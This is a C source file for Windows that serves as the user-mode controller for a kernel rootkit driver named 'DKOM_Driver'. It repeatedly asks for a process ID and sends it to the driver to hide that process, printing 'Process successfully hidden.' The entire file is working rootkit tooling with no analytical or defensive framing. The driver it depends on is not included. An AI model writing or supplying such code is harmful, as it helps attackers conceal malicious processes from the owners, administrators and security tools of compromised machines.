#include <stdio.h>
#include <Windows.h>

int main()
{
    HANDLE hFile;
    DWORD ProcessId,write;

    hFile=CreateFile("\\\\.\\DKOM_Driver",GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);

    if(hFile==INVALID_HANDLE_VALUE)
    {
        printf("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.",GetLastError());
        return -1;
    }

    while(1)
    {
        printf("\nEnter PID: ");
        scanf("%d",&ProcessId);

        if(!WriteFile(hFile,&ProcessId,sizeof(DWORD),&write,NULL))
        {
            printf("\nError: Unable to hide process (%d)\n",GetLastError());
        }

        else
        {
            printf("\nProcess successfully hidden.\n");
        }
    }

    return 0;
}
